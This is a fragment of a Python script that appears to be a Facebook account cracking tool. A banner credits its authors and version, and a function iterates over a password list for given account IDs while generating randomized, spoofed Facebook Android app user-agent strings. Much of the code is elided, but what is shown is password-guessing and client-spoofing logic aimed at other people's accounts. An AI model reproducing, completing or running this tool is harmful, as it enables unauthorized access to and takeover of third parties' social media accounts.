...
\t[×] Developed By Usman Gull{EXTRA} (khalil Ahmed)
{WHITE}[•] AUTHOR       : khalil Ahmed
{WHITE}[•] TEAM         :  Alone
{WHITE}[•] WhatsApp     :   none
[•] FaceBook     :   khalil Ahmed
[•] Version      :   {RED}S1.7
{WHITE}[•] YouTube      :   none
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        USMAN_ua = random.choice(["FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/61.0.0.8.69;FBBV/20569008;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-LS980;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;"])
